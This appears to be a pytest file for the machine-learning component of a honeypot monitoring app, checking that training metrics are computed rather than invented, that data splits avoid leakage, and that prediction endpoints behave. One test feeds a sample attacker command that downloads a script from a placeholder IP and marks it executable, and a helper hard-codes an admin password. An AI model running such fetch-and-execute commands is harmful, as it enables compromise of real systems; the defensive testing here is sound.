import numpy as np

from app.ml import trainer
from app.ml.predictor import predict_single_event


def get_admin_token(client):
    login_res = client.post("/api/v1/auth/login", data={"username": "admin", "password": "Admin@Cyvantis2026!"})
    return login_res.json()["access_token"]


def test_training_metrics_are_measured_not_fabricated(tmp_path, monkeypatch):
    res = trainer.train_models(n_sessions=400, seed=7, output_dir=str(tmp_path))
    assert res["success"] is True
    m = res["metrics"]
    assert m["dataset"]["synthetic"] is True
    # Sample counts come from the actual dataset
    assert m["train_samples"] + m["validation_samples"] + m["test_samples"] == m["total_samples"]
    # Accuracy must equal the confusion-matrix diagonal ratio (i.e. computed from predictions)
    cm = np.array(m["confusion_matrix"]["matrix"])
    assert cm.sum() == m["test_samples"]
    assert abs(np.trace(cm) / cm.sum() - m["accuracy"]) < 1e-3
    assert m["accuracy"] != 0.924
    for cls, stats in m["per_class"].items():
        assert 0.0 <= stats["false_positive_rate"] <= 1.0
    ad = m["anomaly_detector"]
    assert ad["true_positives"] + ad["false_positives"] + ad["false_negatives"] + ad["true_negatives"] == m["test_samples"]


def test_split_has_no_session_leakage():
    df = trainer.build_synthetic_dataset(300, seed=3)
    y = df["label"].to_numpy()
    g = df["session_id"].astype(str).to_numpy()
    tr, va, te = trainer._split(y, g, 3)
    assert not (set(g[tr]) & set(g[te]))
    assert not (set(g[va]) & set(g[te]))
    assert not (set(g[tr]) & set(g[va]))


def test_training_is_reproducible(tmp_path):
    a = trainer.train_models(n_sessions=300, seed=11, output_dir=str(tmp_path / "a"))["metrics"]
    b = trainer.train_models(n_sessions=300, seed=11, output_dir=str(tmp_path / "b"))["metrics"]
    assert a["confusion_matrix"] == b["confusion_matrix"]


def test_prediction_unavailable_without_models(monkeypatch, tmp_path):
    from app.ml import predictor
    monkeypatch.setattr(predictor, "clf_path", str(tmp_path / "missing.joblib"))
    monkeypatch.setattr(predictor, "iso_path", str(tmp_path / "missing2.joblib"))
    predictor.reset_cache()
    res = predictor.predict_single_event({"eventid": "cowrie.command.input", "command": "wget x"})
    assert res["model_status"] == "UNAVAILABLE"
    assert res["predicted_severity"] is None
    predictor.reset_cache()


def test_ml_api_endpoints(client):
    assert client.get("/api/v1/ml/metrics").status_code == 401
    headers = {"Authorization": f"Bearer {get_admin_token(client)}"}
    train_res = client.post("/api/v1/ml/train", json={"sessions": 300, "seed": 5}, headers=headers)
    assert train_res.status_code == 200
    assert train_res.json()["metrics"]["model_version"].startswith("rf-")
    m = client.get("/api/v1/ml/metrics", headers=headers).json()
    assert m["status"] == "TRAINED"
    pred = client.post("/api/v1/ml/predict", json={"command": "wget http://203.0.113.9/a.sh; chmod +x a.sh",
                                                   "eventid": "cowrie.command.input"}, headers=headers).json()
    assert pred["model_status"] == "TRAINED"
    assert pred["predicted_severity"] in ["low", "medium", "high", "critical"]
    assert isinstance(pred["explanation"], list)
    agree = client.get("/api/v1/ml/rule-agreement?limit=100", headers=headers).json()
    assert agree["status"] == "OK"
    assert sum(agree["matrix"].values()) == agree["events"]
